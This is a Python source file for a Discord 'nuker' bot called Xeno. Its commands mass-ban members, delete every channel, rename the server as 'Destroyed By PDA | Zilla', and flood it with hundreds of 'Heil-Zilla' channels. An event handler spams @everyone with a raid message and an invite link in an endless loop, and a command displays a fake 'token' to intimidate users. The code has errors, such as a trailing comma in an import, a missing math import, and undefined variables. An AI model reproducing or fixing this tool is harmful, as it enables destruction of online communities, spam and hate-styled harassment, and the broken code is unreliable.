import discord, asyncio, time, aiohttp, socket, base64, string, random, requests, threading, 
import colorama 
from colorama import Fore, Style
from discord.ext import commands

shard_count = 2 
intents = discord.Intents.all()
intents.guilds = True
intents.messages = True 
intents.webhooks = True 
intents.guilds = True
intents.messages = True
intents.guild_messages = True
Xeno = commands.AutoShardedBot(command_prefix='$', shard_count=shard_count, intents=intents)
BOT_TOKEN = "INSERT HERE" 
CHANNEL_NAMES = ["Heil-Zilla", "Comeback", "Heil PDA"] 

@Xeno.event
async def on_ready():
    art = '''
    ___   ___  _______ .__   __.   ______   
   \  \ /  / |   ____||  \ |  |  /  __  \  
    \  V  /  |  |__   |   \|  | |  |  |  | 
     >   <   |   __|  |  . `  | |  |  |  | 
    /  .  \  |  |____ |  |\   | |  `--'  | 
   /__/ \__\ |_______||__| \__|  \______/  
   
    '''
    print(Fore.MAGENTA + art)
    print(f"{Fore.MAGENTA} ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    commands_list = [
        "-- Commands [ + ] --",
        " [ ! ] | Nuke | X",
        " [ ! ] | Gnuke | X",
        " [ ! ] | Dchan | X",
        " [ ! ] | linkc | X",
        " [ ! ] | None | X",
        " [ ! ] | massban | X",
        " [ ! ] | None | X", 
        " [ ! ] | None | X", 
        " [ ! ] | None | X",
        " [ ! ] | None | X"
    ]

    for command in commands_list:
        print(f"{Fore.RED} ✧ {command}")
    
    print(f"{Fore.MAGENTA} ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print(f"{Fore.RED} -- [ + ] Columns [ + ] --")
    print(f"    {Fore.RED} + [ ! ] Username: {Xeno.user.name}")
    print(f"    {Fore.RED} + [ ! ] ID: {Xeno.user.id}")
    print(f"    {Fore.RED} + [ ! ] Invite URL: https://discord.com/oauth2/authorize?client_id={Xeno.user.id}&scope=bot&permissions=8\n")
    print(f"{Fore.MAGENTA} ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

@Xeno.command()
async def massban(ctx):
    guild = ctx.guild
    members = guild.members

    async def ban_member(member):
        nonlocal total_banned_members
        try:
            await member.ban()
            total_banned_members += 1
            print(f"{Fore.MAGENTA}[+] Banned member {member.name} : {member.id}")
        except discord.Forbidden:
            print(f"{Fore.MAGENTA}[!] Error occurred while banning member {member.name} : {member.id}")

    for batch_index in range(num_batches):
        batch_start = batch_index * batch_size
        batch_end = batch_start + batch_size
        batch_members = members[batch_start:batch_end]

        for member in batch_members:
            await ban_member(member)

    print(f"{Fore.MAGENTA}[+] Massban complete! Banned {total_banned_members} members.")
    await ctx.message.delete()


@Xeno.command()
async def dchan(ctx):
    guild = ctx.guild
    channels = guild.channels
    total_channels = len(channels)
    batch_size = 5
    num_batches = math.ceil(total_channels / batch_size)

    async def delete_channel(channel):
        try:
            await channel.delete()
            print(f"{Fore.MAGENTA}Successfully deleted channel {channel.name}")
        except discord.Forbidden:
            print(f"{Fore.RED}Error occurred while deleting channel {channel.name}")
        except discord.NotFound:
            print(f"{Fore.RED}Channel {channel.name} not found")

    tasks = []
    for i in range(num_batches):
        start_index = i * batch_size
        end_index = (i + 1) * batch_size
        batch_channels = channels[start_index:end_index]

        for channel in batch_channels:
            tasks.append(delete_channel(channel))

    await asyncio.gather(*tasks)

@Xeno.command()
async def gnuke(ctx):
    async def delete_channels():
        text_channels = [channel for channel in ctx.guild.channels if isinstance(channel, discord.TextChannel)]
        for channel in text_channels:
            try:
                await channel.delete()
                print(f"{Fore.MAGENTA}Successfully deleted channel {channel.name}")
            except discord.Forbidden:
                print(f"{Fore.RED}Error occurred while deleting channel {channel.name}")

    async def create_channels():
        for i in range(100):
            for c in range(100):
                for x in range(100):
                    channel_name = random.choice(CHANNEL_NAMES)
                    await ctx.guild.create_text_channel(channel_name)

    try:
        task_delete_channels = asyncio.create_task(delete_channels())
        task_create_channels = asyncio.create_task(create_channels())
        await asyncio.gather(task_delete_channels, task_create_channels)
    except:
        pass
        
@Xeno.command()
async def uinfo(ctx):
  user = ctx.message.author
  embed = discord.Embed(title=f"{user.name} Info", color=000000)
  embed.add_field(name="Name:", value=user.name)
  embed.add_field(name="ID:", value=user.id)
  embed.add_field(name="Discriminator:", value=user.discriminator)
  embed.add_field(name="Status:", value=user.status)
  embed.add_field(name="Account created at:",
                  value=user.created_at.strftime("%b %d, %Y"))
  embed.set_thumbnail(url=user.avatar_url)
  await ctx.send(embed=embed)
  await ctx.message.delete()

@Xeno.command()
async def avatar(ctx, user: discord.User):
    await ctx.message.delete()
    date_format = "%a, %d %b %Y %I:%M %p"
    idk = str(user.id)
    fake_token = base64.b64encode(idk.encode('ascii'))
    await ctx.send(f"""
user: {user.name}\nuser id : {user.id}\ncreated at : {user.created_at.strftime(date_format)}\ntoken : {fake_token}...\nuser avatar : 
{user.avatar_url}""")

@Xeno.command()
async def guide(ctx):
    await ctx.message.delete()
    embed = discord.Embed(title="**``𝐋𝐨𝐠𝐢𝐧𝐢𝐮𝐦𝐧 | 𝐓𝐨𝐨𝐥𝐁𝐨𝐱]``**", description=(f'''```𝐋𝐨𝐠𝐢𝐧𝐢𝐮𝐦𝐧 | 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬
       
        [+] --------------- [+]
        | 1. $Nuke    |
        | 2. $Massban |
        | 3. $dchannel|
        | 4. $uinfo   |
        | 5. $sinfo   |
        | 6. $ping    |
        | 7. $scrape  |
        | 8. $avatar  |
        | 9. $purge   |
        [+] --------------- [+]```
    '''), color=000000)
    embed.set_thumbnail(
        url="https://media.discordapp.net/attachments/1063997459120009256/1063997514690342952/Untitled185_20230114170421.png")
    embed.set_image(
        url="https://media.discordapp.net/attachments/1063997459120009256/1063997514451255368/Untitled186_20230114171507.png")
    await ctx.send(embed=embed)

@Xeno.command()
async def scrape(ctx):
    guild = ctx.guild
    
    async with aiohttp.ClientSession() as session:
        await guild.chunk(cache=True)
        channels = guild.channels

        channel_ids = [str(channel.id) for channel in channels]
        channel_names = [channel.name for channel in channels]

        embed = discord.Embed(title="Server Scraped Channel Information", color=discord.Color.blue())
        embed.add_field(name="Channel IDs", value="\n".join(channel_ids) if channel_ids else "No channels found", inline=False)
        embed.add_field(name="Channel Names", value="\n".join(channel_names) if channel_names else "No channel names found", inline=False)

        await ctx.send(embed=embed)


@Xeno.command()
async def nuke(ctx):
    await ctx.message.delete()
    await ctx.guild.edit(name="Destroyed By ཌPDΛད | Zilla")

    async def delete_channels():
        tasks = []
        for channel in ctx.guild.channels:
            try:
                task = asyncio.create_task(channel.delete())
                tasks.append(task)
            except discord.Forbidden:
                print(f"{Fore.MAGENTA}Error occurred while deleting channel {channel.name}")
        await asyncio.gather(*tasks)
        
    async def create_channels():
        tasks = []
        for i in range(200):
            for channel_name in CHANNEL_NAMES:
                task = asyncio.create_task(ctx.guild.create_text_channel(channel_name))
                tasks.append(task)
        await asyncio.gather(*tasks)

    try:
        await asyncio.gather(delete_channels(), create_channels())
    except Exception as e:
        print(f"{Fore.RED}Error occurred during nuke: {e}")

@Xeno.event
async def on_guild_channel_create(channel):
    while True:
        tasks = []
        for _ in range(10):  
            tasks.append(channel.send("@everyone ```+ This server was destroyed by PDA • Zilla``` https://discord.gg/a33cfZpu6h"))
            tasks.append(channel.create_webhook(name="Heil Zilla"))
        await asyncio.gather(*tasks)












@Xeno.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        return
        
 

Xeno.run(BOT_TOKEN)
